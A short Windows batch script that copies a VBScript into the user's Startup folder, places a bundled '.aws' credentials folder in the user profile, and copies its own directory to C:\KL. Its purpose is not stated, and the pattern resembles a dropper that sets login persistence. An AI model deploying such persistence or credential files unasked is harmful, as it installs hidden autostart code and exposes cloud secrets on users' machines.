@ECHO OFF
MD "C:\USERS\%USERNAME%\.aws"
MD "C:\KL"
XCOPY "startup.vbs" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
XCOPY ".aws" "C:\Users\%USERNAME%\.aws"
XCOPY %~dp0 C:\KL /s
